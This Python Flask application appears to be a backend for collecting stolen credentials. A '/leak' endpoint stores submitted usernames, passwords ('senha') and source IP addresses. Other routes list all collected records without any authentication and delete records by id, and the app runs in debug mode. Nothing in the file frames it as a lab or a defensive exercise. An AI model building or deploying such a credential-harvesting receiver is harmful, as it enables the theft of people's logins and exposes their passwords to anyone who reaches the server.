from flask import Flask, request, jsonify
from database import init_db, db, DadosColetados

app = Flask(__name__)
init_db(app)

@app.route('/leak', methods=['POST', 'GET'])
def coletar_dados():
    dados = request.get_json(force=False, silent=True,cache=True)

    # Simples validação dos dados recebidos
    if not dados or not all(k in dados for k in('user', 'senha', 'origem_ip')):
        return jsonify({'error': 'Campos obrigatórios: user, senha, origem_ip'}), 400
    
    novo_dado = DadosColetados(
        user=dados['user'],
        senha=dados['senha'],
        origem_ip=dados['origem_ip']
        )
    
    db.session.add(novo_dado)
    db.session.commit()

    return jsonify({'message': 'Dados coletados com sucesso', 'id': novo_dado.id}), 201

@app.route('/dados', methods=['GET'])
def listar_dados():
    dados = DadosColetados.query.all()
    return jsonify([d.to_dict() for d in dados]), 200

@app.route('/apagar/<int:id>', methods=['DELETE'])
def apagar_dado(id):
    dado = db.session.get(DadosColetados, id)
    if not dado:
        return jsonify({'error': 'Dado não encontrado'}), 404
    db.session.delete(dado)
    db.session.commit()
    return jsonify({'message': 'Dado apagado com sucesso'}), 200

if __name__ == '__main__':
    app.run(debug=True)